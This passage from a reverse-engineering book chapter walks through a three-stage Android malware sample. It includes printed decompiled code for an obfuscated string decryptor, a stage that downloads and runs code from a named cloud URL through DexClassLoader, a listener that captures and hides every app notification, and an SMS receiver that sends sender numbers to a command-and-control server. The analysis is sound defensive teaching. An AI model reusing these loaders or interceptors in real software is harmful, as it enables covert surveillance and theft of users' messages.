<p class="indent">When reverse engineers get stuck, they might start looking at strings and method names used in apps, hoping to spot interesting leads. This technique takes only a couple of minutes and can lead to new discoveries. For example, malware developers may have forgotten to remove sensitive log strings, or the search might reveal an API call to read the user’s SMS messages.</p>&#13;
<p class="indent">However, without careful planning, searching for strings and method names can be a waste of time, as it depends more on luck than on expertise. To structure your search, you could, for example, develop a regular expression to return all the interesting strings and method names that you can think of. This might include the names of SMS or contact list APIs, as well as strings that match URLs or interesting content providers. The regular expression doesn’t have to be perfect to be useful; you can refine it over time as you discover additional interesting APIs and string patterns. In our sample, for instance, searching for suspicious strings and API names returns a URL in the malicious <em>d.*</em> package we identified earlier.</p>&#13;
<h3 class="h3" id="ch03lev6"><span epub:type="pagebreak" id="page_86"/><strong>The Malware’s First Stage</strong></h3>&#13;
<p class="noindent">We’ve come across the suspicious package <em>d.*</em> several times in this chapter so far. It’s finally time to analyze it. The package is conveniently simple, with just two classes, <code>d.a</code> and <code>d.b</code>. Interestingly, the app doesn’t seem to use <code>d.a</code> at all, while <code>d.b</code> is executed straight from the application entry point in the <code>android.app.Application</code> subclass.</p>&#13;
<p class="indent">It is unclear why <code>d.a</code> is present in the app. The developer might have used the class for testing and forgotten to remove it before releasing the malware. Its code doesn’t seem to be referenced or called from anywhere, its functionality is limited and not obfuscated, and it contains the URL of a command-and-control server in plaintext. Connecting to the URL from this file downloads another code file with more malicious content.</p>&#13;
<p class="indent">The <code>d.b</code> class is the first part of the app’s malicious functionality. We already know that its constructor and the method <code>o</code> run as soon as the application starts. Looking around the class also shows intensive code obfuscation and encryption, for example in <a href="ch03.xhtml#ch3lis5">Listing 3-5</a>, which shows the class’s sole constructor.</p>&#13;
<pre>public b(Context context) {&#13;
  super(context);&#13;
  this.f854g = "3AYdz"; &#13;
  this.h = 9694;&#13;
  this.n = 6249;&#13;
  if (Build.VERSION.SDK_INT == 93) {&#13;
    this.h = PointerIconCompat.TYPE_TEXT;&#13;
    this.f854g = (this.w + this.i).substring(0, this.i.length());&#13;
    this.n = (this.D / 6900) + ((this.x + this.h) / 7607);&#13;
    d(null);&#13;
    return;&#13;
  }&#13;
  this.h = 59;&#13;
}</pre>&#13;
<p class="list" id="ch3lis5"><em>Listing 3-5: The constructor for the malware class <span class="codeitalic1">d.b</span></em></p>&#13;
<p class="indent">The constructor code contains several obfuscation techniques found elsewhere in the class. For example, many attributes are assigned seemingly arbitrary string and integer values. These appear obfuscated or encrypted. The code also has complex-looking arithmetic expressions and opaque predicates. <em>Opaque predicates</em> are expressions that evaluate to true or false and look complicated to calculate, yet always resolve to the same value. Malware uses them to confuse human and automated analysis, for instance by making it harder to follow how <code>if</code> statements branch or how often loop statements repeat.</p>&#13;
<p class="indent">The <code>d.b</code> class uses two kinds of opaque predicate conditions, one of which is shown in the <code>if</code> statement of <a href="ch03.xhtml#ch3lis5">Listing 3-5</a>, which compares the Android SDK version to 93. This check is nonsensical; as of this writing, we’re more than 60 versions (and many decades) away from reaching API <span epub:type="pagebreak" id="page_87"/>level 93. For the time being, this expression will always return false, and the instructions inside the <code>if</code> block will never execute.</p>&#13;
<p class="indent">The second opaque predicate condition in this class uses Java’s <code>java.util.Calendar</code> API, as shown in <a href="ch03.xhtml#ch3lis6">Listing 3-6</a>.</p>&#13;
<pre>if (Calendar.getInstance().get(4) &gt;= 196) {</pre>&#13;
<p class="list" id="ch3lis6"><em>Listing 3-6: The malware class <span class="codeitalic1">d.b</span> uses the Calendar API to build opaque predicates.</em></p>&#13;
<p class="indent">This code asks the default system calendar for the number of the current week in the current month. Return values of this API must be between 0 and 6, so the expression can never be true, and the instructions in this <code>if</code> block never execute, either.</p>&#13;
<h4 class="h4" id="ch03lev1sec15"><strong><em>Understanding the Malicious Class</em></strong></h4>&#13;
<p class="noindent">We’ve now identified the techniques used in <code>d.b</code> to make analysis harder, but we still have to defeat them to understand what the malware is doing. Luckily, the malware authors made some crucial mistakes that we can exploit. Without these mistakes, we may have had to trawl through nearly 1,000 lines of painful-to-read code.</p>&#13;
<p class="indent">The developers’ first mistake was to reuse the same few techniques. For the opaque predicates, it’s easy to eyeball whether the check is for a legitimate API version or a realistic calendar date. The arithmetic expressions and assignments of seemingly random values to attributes all look similar, too. As a human reviewer, you can make use of your brain’s pattern-recognition powers and rapidly scan the code to find instructions that are visually different. In the next section, when we rebuild the class’s string decryption algorithm, you will see that these different instructions are really the only ones that matter.</p>&#13;
<p class="indent">The developers’ second mistake was to leave strings in the class intact. Although they obfuscated these strings to the point of illegibility, they still left them at the exact places where they are passed to standard APIs, as shown in <a href="ch03.xhtml#ch3lis7">Listing 3-7</a>.</p>&#13;
<pre>return cls.getMethod(&#13;
  p("qmqMRa3e34OrqtqLdSAnAjne4p4ssoXYOMh"),&#13;
  new Class[0]).invoke(newInstance, new Object[0]);</pre>&#13;
<p class="list" id="ch3lis7"><em>Listing 3-7: The malware class <span class="codeitalic1">d.b</span> encrypts strings but leaves them in place.</em></p>&#13;
<p class="indent">As the reflection API requires an unobfuscated, plaintext string to work, it’s clear that the <code>p</code> method returns that string. Moreover, it’s highly likely that the argument to <code>p</code> is the obfuscated and encrypted string, and that <code>p</code> decrypts it to the method name string expected by the <code>getMethod</code> API.</p>&#13;
<h4 class="h4" id="ch03lev1sec16"><strong><em>Reverse Engineering the String Decryption Method</em></strong></h4>&#13;
<p class="noindent">The <code>p</code> method looks daunting at first, with nearly 50 lines of obfuscated code. However, the developers made additional mistakes here, so reverse <span epub:type="pagebreak" id="page_88"/>engineering <code>p</code> is easy. For brevity, we omit the full method code and instead build up the relevant parts of it in this section.</p>&#13;
<p class="indent">Recall that the most important aspect of this method is its return value, which must be the decrypted string fed into the reflection API. Stripping all instructions but the return value instruction leaves us with the code shown in <a href="ch03.xhtml#ch3lis8">Listing 3-8</a>.</p>&#13;
<pre>public final String p(String str) {&#13;
  return sb.toString();&#13;
}</pre>&#13;
<p class="list" id="ch3lis8"><em>Listing 3-8: The <span class="codeitalic1">p</span> method stripped down to its return value</em></p>&#13;
<p class="indent">Because we’re really only after the content of <code>sb</code>, we now need to bring in all the lines that contribute to the value of <code>sb</code>. In jadx, we can select the variable <code>sb</code> to highlight all other uses of it. Adding these lines produces the code in <a href="ch03.xhtml#ch3lis9">Listing 3-9</a>.</p>&#13;
<pre>public final String p(String str) {&#13;
  StringBuilder sb = new StringBuilder();&#13;
&#13;
  if (sb.length() % 2 == 0) {&#13;
    sb.append(str.charAt(length));&#13;
  }&#13;
  else {&#13;
    sb.append(str.charAt(length));&#13;
  }&#13;
  &#13;
  return sb.toString();&#13;
}</pre>&#13;
<p class="list" id="ch3lis9"><em>Listing 3-9: The <span class="codeitalic1">p</span> method with the references to <span class="codeitalic1">sb</span> included</em></p>&#13;
<p class="indent">As this code expansion pulled in another variable, <code>length</code>, we also need to add all the lines of code that manipulate this variable. We do this in <a href="ch03.xhtml#ch3lis10">Listing 3-10</a>.</p>&#13;
<pre>public final String p(String str) {&#13;
  StringBuilder sb = new StringBuilder();&#13;
&#13;
  int length = (str.length() - 1) + (-5);&#13;
  while (length &gt;= 0) {&#13;
    if (sb.length() % 2 == 0) {&#13;
      sb.append(str.charAt(length));&#13;
      length -= 4;&#13;
    }&#13;
    else {&#13;
      sb.append(str.charAt(length));&#13;
      length -= 2;&#13;
    <span epub:type="pagebreak" id="page_89"/>}&#13;
  }&#13;
&#13;
  return sb.toString();&#13;
}</pre>&#13;
<p class="list" id="ch3lis10"><em>Listing 3-10: The complete decryption method</em></p>&#13;
<p class="indent">This last step did not pull in any more variables, so we’re done. Of the 50 original lines in <code>p</code>, only these lines contribute to string decryption. The malware authors added the rest of the code to mislead us. Compiling and running this code in Java confirms that it decrypts the string <code>qmqMRa3e34OrqtqLdSAnAjne4p4ssoXYOMh</code> to <code>openStream</code>, the name of the method that is looked up through reflection.</p>&#13;
<p class="indent">The crucial mistake that allowed us to speedily recover the decryption code is that the developers mixed original instructions with obfuscating instructions but kept the data flow of the original code completely separate from the data flow of the obfuscated code. Thus, the code initially appears difficult to read and hard to follow, but when we look only at variables and how they influence each other, we can easily extract the original code without having to consider the obfuscation at all.</p>&#13;
<p class="indent">The small size of the decryption method allowed us to trace the data flow manually. To avoid similar manual work in the future, we could write code that performs these steps automatically using techniques from compiler theory, like use-definition chains.</p>&#13;
<h4 class="h4" id="ch03lev1sec17"><strong><em>Decrypting All Strings in the Class</em></strong></h4>&#13;
<p class="noindent">Now that we’ve understood the decryption method and rebuilt it in Java, we can easily decode all the strings in the <code>d.b</code> class. Unless malware developers go the extra mile to hide this connection, there tends to be a strong correlation between the length of an obfuscated or encrypted string and its importance. The string starting with <code>PnPt</code> seems to be the longest, and sure enough, once decoded, it translates to a URL.</p>&#13;
<p class="indent">The decoded URL is the same one we found earlier in the <code>d.a</code> class. By connecting to it, we were able to download a file called <em>ban</em>, which contains the code of the next stage. The rest of the code in <code>d.b</code> downloads this code file and loads it through the reflection API. We leave following this process as an exercise for the reader.</p>&#13;
<h3 class="h3" id="ch03lev7"><strong>The Malware’s Second Stage</strong></h3>&#13;
<p class="noindent">The <em>ban</em> file is much smaller and less obfuscated than the <code>d.b</code> class. You’ll commonly find this to be the case in later malware stages, which generally contain less functionality. Malware developers might also think that their first stage has enough protection.</p>&#13;
<p class="indent">The <em>ban</em> file contains two packages, <em>yin.*</em> and <em>com.*</em>. The <em>yin.*</em> package contains only three small classes. One of these, <code>yin.Chao</code>, is loaded by the first stage in <code>d.b</code>, as shown in <a href="ch03.xhtml#ch3lis11">Listing 3-11</a>.<span epub:type="pagebreak" id="page_90"/></p>&#13;
<pre>Class&lt;?&gt; cls = Class.forName( &#13;
  p("2r2++eEdEysahohVVLdsdOUsCaCN9lJCJnBxyeyXoD-.&#13;
  o7mjejHrtjsjF:yisi2B.4k4K5iovoH5lWaWildMY.W:"));&#13;
  ...&#13;
Class&lt;?&gt; cls2 = (Class) ((Method) j(&#13;
  cls, p("WC6sGsGJlaVlVteC=d=J:anonPkleEBJ-"))).invoke(&#13;
    newInstance, p("fofRiawhwZyCx.xF-nViVkrysJ4iJ"));</pre>&#13;
<p class="list" id="ch3lis11"><em>Listing 3-11: The malware obfuscates its invoking of <span class="codeitalic1">yin.Chao</span> through encrypted strings.</em></p>&#13;
<p class="indent">The three obfuscated strings decrypt to <code>dalvik.system.DexClassLoader</code>, <code>loadClass</code>, and <code>yin.Chao</code>, in that order.</p>&#13;
<h4 class="h4" id="ch03lev1sec18"><strong><em>Entry Points</em></strong></h4>&#13;
<p class="noindent">While the code is small enough to simply read, let’s use our structured approach to find interesting entry points to our analysis. This approach makes sure that we don’t miss interesting functionality.</p>&#13;
<p class="indent">As <em>ban</em> is a dynamically loaded plug-in file, our analysis of it will differ from our first-stage analysis in some major ways. Most importantly, plug-in files do not have a manifest file, making it much harder to find permissions or entry points. In fact, plug-ins have no predefined entry point. The code that loads the plug-in can declare the class and method in which the plug-in should begin to run.</p>&#13;
<h5 class="h5" id="ch03sec1sec1">Permissions</h5>&#13;
<p class="noindent">Plug-in files like <em>ban</em> can use only the permissions declared in the manifest file of the app that loads them. Knowing this, we can simply revisit the permissions we discovered earlier. A text search for <em>permission</em> in jadx returns two distinct parts of <em>ban</em>. In the <code>com.gppp.hk.b.b</code> class, a string array mentions the <code>READ_PHONE_STATE</code> and <code>READ_CONTACTS</code> permissions. In the <code>com.gppp.hk.a.a</code> class, code requests these permissions. Later in this chapter, you’ll see that the malware uses the <code>READ_PHONE_STATE</code> permission to access the device’s phone number. The use of <code>READ_CONTACTS</code> remains unclear.</p>&#13;
<p class="indent">Of course, <em>ban</em> might make use of other permissions declared in the main app’s manifest file. As an exercise, try using one of the previously discussed permission maps to find permission-protected API calls.</p>&#13;
<h5 class="h5" id="ch03sec1sec2">The Main Entry Point</h5>&#13;
<p class="noindent">We mentioned that the code loading the plug-in gets to decide where in the plug-in execution begins. To find this entry point, we need to revisit the <code>d.b</code> class of the first stage, where the encrypted string <code>fofRiawhwZyCx.xF-nViVkrysJ4iJ</code> decrypts to <code>yin.Chao</code>. Its first method is also called <code>yin</code>, once decrypted. If we don’t find any better leads, starting with <code>yin.Chao</code> is a good idea, as it will allow us to understand the malware’s second stage from its first executed line of code.<span epub:type="pagebreak" id="page_91"/></p>&#13;
<h5 class="h5" id="ch03sec1sec3">Activities, Services, and Broadcast Receivers</h5>&#13;
<p class="noindent">In addition to the main entry point into <em>ban</em>, we can also look for activities, services, and broadcast receivers. Using jadx’s search function shows one activity and one service, but no broadcast receivers.</p>&#13;
<p class="indent">While the activity <code>com.gufra.base_normal.MainActivity</code> seems unused, the service in <code>com.gppp.hk.b.a</code> is important. This is the base class of the notification listener <code>com.bp.statis.bloodsugar.PE</code>, which intercepts app notifications on behalf of the malware. Later in this section, we’ll explain this service in more detail.</p>&#13;
<p class="indent">Note that there are other service subclasses of <code>com.gppp.hk.b.a</code>, but the app cannot run them because they are not declared in the manifest file. We’ll ignore these services going forward, as they appear to be dead code.</p>&#13;
<h5 class="h5" id="ch03sec1sec4">Anti-Analysis Tricks and Hidden Code</h5>&#13;
<p class="noindent">While this second stage includes no native code or uses of the encryption package <em>javax.crypto</em>, we can find some interesting uses of the reflection API. Searching for <em>reflect</em> in jadx shows five instances of it, of which <code>com.gppp.hk.a.b.a</code> is the most relevant, as it contains another URL string. Further described later in this chapter, this class is responsible for downloading and running the third stage of the malware.</p>&#13;
<h5 class="h5" id="ch03sec1sec5">Strings and API Names</h5>&#13;
<p class="noindent">Besides functionality related to permissions, reflection, and the previously mentioned URL from which to download the third stage, there is little more to discover from a search for strings and method names.</p>&#13;
<p class="indent">For example, a search for <em>sms</em> returns a single line, where the malware checks whether it is the default SMS handler configured on the system, but that’s it. The second stage is just too small for any other discoveries.</p>&#13;
<h4 class="h4" id="ch03lev1sec19"><strong><em>The yin.Chao.yin Method</em></strong></h4>&#13;
<p class="noindent">Let’s take a look at the code for <code>yin.Chao.yin</code>, the method from which the main app executes the plug-in. As shown in <a href="ch03.xhtml#ch3lis12">Listing 3-12</a>, it starts a new thread from which to call a few other methods.</p>&#13;
<pre>public static void yin(final Context context, final String str) {&#13;
  new Thread(new Runnable() { // from class: yin.Chao.1&#13;
    @Override // java.lang.Runnable&#13;
    public void run() {&#13;
      try {&#13;
        Hook.hook2(context, str);&#13;
      } catch (Exception e) {&#13;
        e.printStackTrace();&#13;
      }&#13;
      ((Application) context).registerActivityLifecycleCallbacks(new a(r3));&#13;
      try {&#13;
        Thread.sleep(1000L);&#13;
      <span epub:type="pagebreak" id="page_92"/>} catch (InterruptedException e2) {&#13;
        e2.printStackTrace();&#13;
      }&#13;
       Chao.Nti(context, r3);&#13;
       b.a(context);&#13;
    }&#13;
  }).start();&#13;
}</pre>&#13;
<p class="list" id="ch3lis12"><em>Listing 3-12: The <span class="codeitalic1">yin.Chao.yin</span> method is the entry point into the malware’s second stage.</em></p>&#13;
<p class="indent">A cursory glance at these other methods shows that the last two, <code>Chao.Nti</code> and <code>b.a</code>, may be interesting. Code in <code>Chao.Nti</code>, shown in <a href="ch03.xhtml#ch3lis13">Listing 3-13</a>, checks whether the user has already granted the app permission to process notifications sent by all other apps. If not, the app shows the dialog for granting that permission.</p>&#13;
<pre>public static void Nti(Context context, String str) {&#13;
  try {&#13;
    Class&lt;?&gt; cls = Class.forName(str);&#13;
    String string = Settings.Secure.getString(&#13;
      context.getContentResolver(), "enabled_notification_listeners");&#13;
    if (string == null || !string.contains(context.getPackageName())) {&#13;
      Intent intent = new Intent();&#13;
      intent.setAction(&#13;
        "android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");&#13;
      intent.putExtra(&#13;
        "android.provider.extra.APP_PACKAGE", context.getPackageName());&#13;
      intent.addFlags(805306368);&#13;
      context.startActivity(intent);&#13;
    } else {&#13;
      c.a(context, cls);&#13;
    }&#13;
  } catch (Exception unused) {&#13;
  }&#13;
}</pre>&#13;
<p class="list" id="ch3lis13"><em>Listing 3-13: <span class="codeitalic1">Chao.Nti</span> tries to get access to all app notifications.</em></p>&#13;
<p class="indent">Recall that we previously saw a service for processing app notifications declared in the manifest file, but that we couldn’t find the code for it. This method seems to be it.</p>&#13;
<p class="indent">The <code>b.a</code> method, whose fully qualified name is <code>com.gppp.hk.a.b.a</code>, is even more interesting. As you can see in <a href="ch03.xhtml#ch3lis14">Listing 3-14</a>, it opens a connection to <em>https://xn3o.oss-accelerate.aliyuncs.com/xn3o</em>, downloads yet another code stage from there, and executes the downloaded code with the <code>DexClassLoader</code> API.</p>&#13;
<pre>HttpURLConnection httpURLConnection = (HttpURLConnection) new URL(&#13;
  "https://xn3o.oss-accelerate.aliyuncs.com/xn3o").openConnection();&#13;
httpURLConnection.connect();&#13;
<span epub:type="pagebreak" id="page_93"/>if (httpURLConnection.getResponseCode() == 200) {&#13;
  InputStream inputStream = httpURLConnection.getInputStream();&#13;
  FileOutputStream fileOutputStream = new FileOutputStream(file);&#13;
  byte[] bArr = new byte[1024];&#13;
  while (true) {&#13;
    int read = inputStream.read(bArr);&#13;
    if (-1 == read) {&#13;
      break;&#13;
    } &#13;
    fileOutputStream.write(bArr, 0, read);&#13;
  }&#13;
  if (file.exists()) {&#13;
    Class loadClass2 = new DexClassLoader(&#13;
      file.getPath(), file.getAbsolutePath(), "", &#13;
      context.getClassLoader()).loadClass("com.xn3o");&#13;
    Log.i("fb_nor", "c" + loadClass2.getName());&#13;
    Method method2 = loadClass2.getMethod("xn3o", Context.class);&#13;
    Log.i("fb_nor", "m" + method2.getName());&#13;
    method2.invoke(null, context);&#13;
  }&#13;
}</pre>&#13;
<p class="list" id="ch3lis14"><em>Listing 3-14: The method <span class="codeitalic1">com.gppp.hk.a.b.a</span> downloads the third malware stage.</em></p>&#13;
<p class="indent">The two other methods called by <code>yin.Chao.yin</code> seem less interesting. The <code>Hook.hook2</code> method contains code for merging the app’s default class loader with a new class loader. Its code seems to have been copied from Chinese-origin Android plug-in tutorials, reminding us to always search for any kind of boilerplate code we encounter during analysis. The call to <code>registerActivityLifecycleCallbacks</code> registers a callback that prompts the user to grant certain permissions at various stages of the app’s lifecycle.</p>&#13;
<h4 class="h4" id="ch03lev1sec20"><strong><em>The com.* Package</em></strong></h4>&#13;
<p class="noindent">Before moving on to the third stage, let’s have a quick look at <em>ban</em>’s second package, <em>com.*</em>. It contains a whole lot of subpackages with different names yet similar code. For example, in the <em>com.bp.statis.bloodsugar</em> package, we find one class, <code>PE</code>. This is the notification listener service declared in the manifest file. Its code is tiny, as it merely forwards the incoming notification to its parent class, <code>com.gppp.hk.b.a</code>. Most other subpackages of the <em>com.*</em> package have a similar structure. We can assume that the names of the subpackages belong to other malware samples of the same family.</p>&#13;
<p class="indent">The code in the parent class <code>com.gppp.hk.b.a</code> is likewise small. Shown in <a href="ch03.xhtml#ch3lis15">Listing 3-15</a>, it takes incoming notifications, forwards them to other parts of the app with a broadcast message, and then hides the original notification from the user.</p>&#13;
<pre>private void post(StatusBarNotification statusBarNotification) {&#13;
  CharSequence charSequence = &#13;
    <span epub:type="pagebreak" id="page_94"/>statusBarNotification.getNotification().extras.getCharSequence(&#13;
      "android.text");&#13;
  if (!TextUtils.isEmpty(charSequence)) {&#13;
    Intent intent = new Intent("action_text");&#13;
    intent.putExtra("android.text", charSequence.toString());&#13;
    sendBroadcast(intent);&#13;
  }&#13;
  cancelAllNotifications();&#13;
}</pre>&#13;
<p class="list" id="ch3lis15"><em>Listing 3-15: The <span class="codeitalic1">com.gppp.hk.b.a</span> class intercepts notifications from all other apps on the device.</em></p>&#13;
<p class="indent">This code uses context-registered messages and broadcast receivers that aren’t declared in the manifest file. Somewhere else, probably in the same app, we should find a broadcast receiver that listens for broadcasts of type <code>action_text</code>. Locating this broadcast receiver can often be tricky, but in this particular malware sample, it’s not. If you search for <em>action_text</em> in the code of the malware’s third stage, you’ll find it.</p>&#13;
<p class="indent">To summarize, the whole purpose of the second stage is to make sure that the app has access to notifications from all apps on the system. It intercepts them and sends their contents to the third stage, which the second stage also downloads and executes.</p>&#13;
<h3 class="h3" id="ch03lev8"><strong>The Malware’s Third Stage</strong></h3>&#13;
<p class="noindent">The third, and main, stage of this malware sample contains the majority of its malicious functionality. It has more classes, and a lot more code, than the previous two stages. Loading the third stage in jadx shows code in packages <em>com</em> and <em>vgy7.vgy7.vgy7.vgy7.*</em>.</p>&#13;
<p class="indent">These two packages are very different. The <em>com</em> package contains just one class, <code>com.xn3o</code>. The <em>vgy7.vgy7.vgy7.vgy7.*</em> package contains 10 classes distributed across multiple subpackages. The malware authors spent some effort obfuscating variable names and strings, but it’s still possible to eyeball what’s going on. For example, the class <code>vgy7.vgy7.vgy7.vgy7.vgy7</code> contains a bunch of poorly obfuscated strings that hint at network, telephony, and JavaScript functionality.</p>&#13;
<p class="indent">This third stage is unfortunately way too large to fully explain in this chapter. It contains significant chunks of custom code for manipulating certain premium service sign-up pages and thwarting their anti-bot protections. All the code in this stage contributes to this malicious functionality, so it’s hard to completely ignore certain packages. Instead, we describe only the beginning of the third stage’s analysis.</p>&#13;
<h4 class="h4" id="ch03lev1sec21"><strong><em>jadx Decompilation Issues</em></strong></h4>&#13;
<p class="noindent">Decompiling the code in <em>com.xn3o.xn3o</em> is beyond jadx’s capabilities, which happens occasionally when you try to load larger and more complex pieces of code. As a first workaround, try the jadx option called <em>Show Inconsistent Code</em>, <span epub:type="pagebreak" id="page_95"/>which shows the parts of the code that could not be properly disassembled. The inconsistent code is mostly correct, but not perfectly so. When it comes to methods that are important to understand correctly, say a decryption method, it’s best to get a second opinion.</p>&#13;
<p class="indent">You can get this second opinion by using other Android decompilers. For example, the Bytecode Viewer tool includes six different Android decompilers. Usually at least one of them can produce some reasonable decompiled code for any Android app.</p>&#13;
<h4 class="h4" id="ch03lev1sec22"><strong><em>Entry Points</em></strong></h4>&#13;
<p class="noindent">With just 11 classes, it’s possible to manually scan the entire code for interesting functionality. But to sharpen our reverse engineering processes, let’s return to the techniques we’ve introduced previously to find entry points: looking at permissions; the main entry point; activities, services, and broadcast receivers; anti-analysis tricks and hidden code; and string and API names.</p>&#13;
<h5 class="h5" id="ch03sec1sec6">Permissions</h5>&#13;
<p class="noindent">Like the second stage, the third stage is a dynamically loaded plug-in, which means that the permissions available to it must be declared in the main app’s manifest file. Searching for permissions in jadx shows references to the <code>SEND_SMS</code> and <code>RECEIVE_SMS</code> permissions. Because these two permissions were not declared in the first stage’s manifest file, <em>xn3o</em> won’t be able to use them. It is likely that <em>xn3o</em> is loaded by many different malware apps, some of which have access to one or both of the SMS permissions. Alternatively, the app may nudge the user to install newer versions of itself that declare these permissions, but in this particular malware we have not seen such functionality.</p>&#13;
<p class="indent">Even though this app can’t use the SMS permissions, we can still find it worthwhile to understand how they are used when loaded into other apps. The first line of <a href="ch03.xhtml#ch3lis16">Listing 3-16</a> calls the method <code>bhu8</code>, which indirectly calls the <code>PackageManager.checkPermission</code> method to check for the availability of the <code>RECEIVE_SMS</code> permission. The second line checks for the <code>SEND_SMS</code> permission. The results are stored in two variables and later sent to the malware’s command-and-control server.</p>&#13;
<pre>bhu8 = vgy7.vgy7.vgy7.vgy7.bhu8.bhu8(context);&#13;
if (context.getPackageManager().checkPermission(&#13;
    "android.permission.SEND_SMS", context.getPackageName()) != 0) {&#13;
  z3 = false;&#13;
}</pre>&#13;
<p class="list" id="ch3lis16"><em>Listing 3-16: The malware’s third stage checks for <span class="codeitalic1">RECEIVE_SMS and SEND_SMS</span> permissions.</em></p>&#13;
<p class="indent">Now that we know that <em>xn3o</em> uses SMS permissions when they’re available, we can search jadx for <em>sms</em> to surface several entry points into the malicious functionality. The class <code>vgy7.vgy7.vgy7.vgy7.bhu8</code> contains references to the API <code>sendTextMessage</code>, while <code>vgy7.vgy7.vgy7.vgy7.cft6.bhu8</code> contains code for <span epub:type="pagebreak" id="page_96"/>receiving and handling incoming text messages. Besides SMS permissions, <em>xn3o</em> does not seem to check for any other permissions.</p>&#13;
<h5 class="h5" id="ch03sec1sec7">The Main Entry Point</h5>&#13;
<p class="noindent">The main entry point into <em>xn3o</em> is defined by the second stage, <em>ban</em>. <a href="ch03.xhtml#ch3lis17">Listing 3-17</a> shows that the third stage’s execution starts in the <code>com.xn3o</code> class’s <code>xn3o</code> method.</p>&#13;
<pre>Class loadClass = new DexClassLoader(&#13;
  file.getPath(), file.getAbsolutePath(), "", &#13;
  context.getClassLoader()).loadClass("com.xn3o");&#13;
Log.i("fb_nor", "c" + loadClass.getName());&#13;
Method method = loadClass.getMethod("xn3o", Context.class);&#13;
Log.i("fb_nor", "m" + method.getName());&#13;
method.invoke(null, context);</pre>&#13;
<p class="list" id="ch3lis17"><em>Listing 3-17: Code in</em> ban <em>executes the</em> <span class="codeitalic1">com.xn3o.xn3o</span> <em>method in the third stage.</em></p>&#13;
<p class="indent">If we don’t find any better leads, we could start trying to understand the functionality of the third stage from there. For now, let’s consider other potential entry points.</p>&#13;
<h5 class="h5" id="ch03sec1sec8">Activities, Services, and Broadcast Receivers</h5>&#13;
<p class="noindent">We can also look for activities, services, and broadcast receivers. Using jadx’s search function shows just two broadcast receivers and not much else. The first broadcast receiver handles messages sent by the second stage with <code>android.text</code>. Recall that this broadcast contains intercepted app notifications. A look into the method <code>bhu8.vgy7</code>, called from the last line of <a href="ch03.xhtml#ch3lis18">Listing 3-18</a>, shows that the app stores the intercepted notifications in a list for later processing.</p>&#13;
<pre>@Override // android.content.BroadcastReceiver&#13;
public void onReceive(Context context, Intent intent) {&#13;
  String stringExtra = intent.getStringExtra(this.f5vgy7);&#13;
  if (TextUtils.isEmpty(stringExtra)) {&#13;
    stringExtra = intent.getStringExtra("android.text");&#13;
  }&#13;
  if (TextUtils.isEmpty(stringExtra)) {&#13;
    stringExtra = intent.getStringExtra("at");&#13;
    if (!TextUtils.isEmpty(stringExtra) &amp;&amp; !Telephony.Sms.getDefaultSmsPackage(&#13;
        bhu8.this.f2vgy7).equals(intent.getStringExtra("ap"))) {&#13;
      return;&#13;
    }&#13;
  }&#13;
  bhu8.vgy7(stringExtra);&#13;
}</pre>&#13;
<p class="list" id="ch3lis18"><em>Listing 3-18: The first broadcast receiver processes previously intercepted app notifications.</em></p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_97"/>The second broadcast receiver (<a href="ch03.xhtml#ch3lis19">Listing 3-19</a>) handles incoming text messages. It calls the same <code>bhu8.vgy7</code> method to store and process the intercepted messages that it previously used to handle intercepted notifications. The one difference is that it also pings its command-and-control server if the text message starts with <em>rch</em>.</p>&#13;
<pre>public void onReceive(Context context, Intent intent) {&#13;
  vgy7.vgy7.vgy7.vgy7.mko0.vgy7 vgy7Var;&#13;
  Object[] objArr = (Object[]) intent.getExtras().get(&#13;
    vgy7.vgy7.vgy7.vgy7.vgy7.c);&#13;
  if (objArr != null) {&#13;
    for (Object obj : objArr) {&#13;
      SmsMessage createFromPdu = SmsMessage.createFromPdu((byte[]) obj);&#13;
      String messageBody = createFromPdu.getMessageBody();&#13;
      if (messageBody != null &amp;&amp; messageBody.startsWith("rch")) {&#13;
        new Thread(new vgy7(this, "http://" + vgy7.vgy7.vgy7.vgy7.vgy7.wsx2 +&#13;
          "/op/pair?remote=" + vgy7.vgy7.vgy7.vgy7.bhu8.bhu8 + "&amp;device_id=" +&#13;
          messageBody.substring(3) + "&amp;number=" + URLEncoder.encode(&#13;
            createFromPdu.getOriginatingAddress()))).start();&#13;
      }&#13;
      bhu8 bhu8Var = bhu8.zse4;&#13;
      if (!(bhu8Var == null || (vgy7Var = bhu8Var.mko0) == null)) {&#13;
        vgy7Var.mko0("sms_from:" + createFromPdu.getOriginatingAddress());&#13;
      }&#13;
      bhu8.vgy7(createFromPdu.getMessageBody());&#13;
    }&#13;
  }&#13;
}</pre>&#13;
<p class="list" id="ch3lis19"><em>Listing 3-19: The second broadcast receiver intercepts incoming SMS messages for processing.</em></p>&#13;
<p class="indent">Why the malware looks for <em>rch</em> is unclear. One possibility is that the malware authors send these messages to communicate with the malware as an alternative to using the HTTP-based command-and-control server.</p>&#13;
<h5 class="h5" id="ch03sec1sec9">Anti-Analysis Tricks and Hidden Code</h5>&#13;
<p class="noindent">Looking for typical anti-analysis tricks also works in the third stage. While there is no native code or uses of the encryption package <em>javax.crypto</em>, we can find some interesting uses of <em>android.util.Base64</em>. In <a href="ch03.xhtml#ch3lis20">Listing 3-20</a>, you can see a method that encodes a byte array using Base64 and then passes the encoded byte array to another function.</p>&#13;
<pre>public static byte[] vgy7(byte[] bArr) {&#13;
  return vgy7(Base64.encodeToString(bArr, 2), true).getBytes();&#13;
}</pre>&#13;
<p class="list" id="ch3lis20"><em>Listing 3-20: The malware uses Base64 encoding and custom encryption to communicate with the server.</em></p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_98"/>As you’ll soon see, this other function, <code>vgy7</code>, is responsible for encrypting and decrypting the malware’s communications with its command-and-control server.</p>&#13;
<h5 class="h5" id="ch03sec1sec10">Strings and API Names</h5>&#13;
<p class="noindent">Besides functionality related to permissions, SMS, and encoding, we can surface some other interesting parts of the code by searching for strings and method names. A search for <em>HTTP</em> shows embedded URLs, as well as code from the <em>java.net</em> package used to connect to these URLs. Later in this chapter, you’ll learn that many of these URLs are for communicating with the malware’s command-and-control server.</p>&#13;
<h4 class="h4" id="ch03lev1sec23"><strong><em>Name Mangling</em></strong></h4>&#13;
<p class="noindent">Now that we’ve found many ways to proceed with the analysis, we have to make the obfuscated code more readable. One of the most important tools in a reverse engineer’s toolbox is the ability to rename variables, methods, classes, and other names in a program. Malware developers like to throw name mangling techniques at malware analysts, so you’ll often have to reverse those techniques to resurface the original code.</p>&#13;
